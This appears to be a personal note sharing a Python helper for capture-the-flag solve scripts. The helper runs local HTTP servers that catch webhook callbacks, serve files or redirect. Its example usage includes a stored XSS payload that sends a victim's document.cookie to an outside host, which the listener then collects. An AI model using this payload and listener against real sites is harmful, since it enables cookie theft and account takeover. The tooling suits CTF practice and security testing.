---
created: 2024-12-15T17:28
updated: 2024-12-15T17:32
---

Easy to use python auto webhook.

Can be embed into solve scripts easily.

No longer do you need to open webhook.site.

Best paired with Cloudflare tunnels.

## example usage

```python
print(s.put(f"{target}/api/bounties/{b['id']}", json={
    "description": "<img src=1 onerror='location.href=\"https://1337.yun.ng/?\"+document.cookie'/>"
}).text)
stop, wait = webhook(1337)
print(s.get(f"{target}/api/report/{b['id']}").text)
data = wait()
stop()
```

## source

```python [server.py]
import http.server
import socketserver
import threading
from time import sleep
from urllib.parse import urlparse, parse_qs


def serve_file(bytes, port, content_type="application/octet-stream"):
    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(bytes)

    server = socketserver.TCPServer(("", port), CustomHandler)

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    def stop_server():
        server.shutdown()
        server.server_close()

    return stop_server


def webhook(port):
    query_components = None

    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            nonlocal query_components
            query_components = parse_qs(urlparse(self.path).query)
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            response = f"Query Params: {query_components}"
            self.wfile.write(response.encode())

    server = socketserver.TCPServer(("", port), CustomHandler)

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    def stop_server():
        server.shutdown()
        server.server_close()
        return query_components

    def wait_for_webhook():
        nonlocal query_components
        while not query_components:
            sleep(0.1)
        data = query_components
        query_components = None
        return data

    return stop_server, wait_for_webhook


def redirect(port, url):
    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", url)
            self.end_headers()

    server = socketserver.TCPServer(("", port), CustomHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    def stop_server():
        server.shutdown()
        server.server_close()
    return stop_server
```
